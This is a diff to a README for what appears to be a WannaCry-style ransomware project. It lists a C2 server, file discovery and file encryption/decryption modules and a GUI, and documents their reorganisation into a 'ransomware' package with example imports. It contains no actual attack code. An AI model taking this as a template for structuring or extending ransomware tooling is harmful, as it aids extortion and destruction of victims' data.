@@ -66,4 +66,24 @@ python c2_server_alt.py
 - `c2_server/` — All C2 server code and related files
 - `discover.py` — File discovery logic
 - `modify.py` — File encryption/decryption logic
-- `
+- `gui_main.py` — Main GUI entry point
+- `__init__.py` — Package marker
+
+## Modular Structure Update
+
+The codebase has been refactored for modularity:
+
+- All core logic is now in the `ransomware/` package:
+  - `ransomware/discover.py`: File discovery logic
+  - `ransomware/modify.py`: File modification (encryption/decryption)
+  - `ransomware/gui_main.py`: Main GUI entry point (formerly `wannacry_gui.py`)
+  - `ransomware/__init__.py`: Package marker
+
+Update your imports to use the new package structure, e.g.:
+
+```python
+from ransomware import discover, modify
+from ransomware.gui_main import WannaCryGUI
+```
+
+All previous functionality is preserved, but now organized for clarity and maintainability.
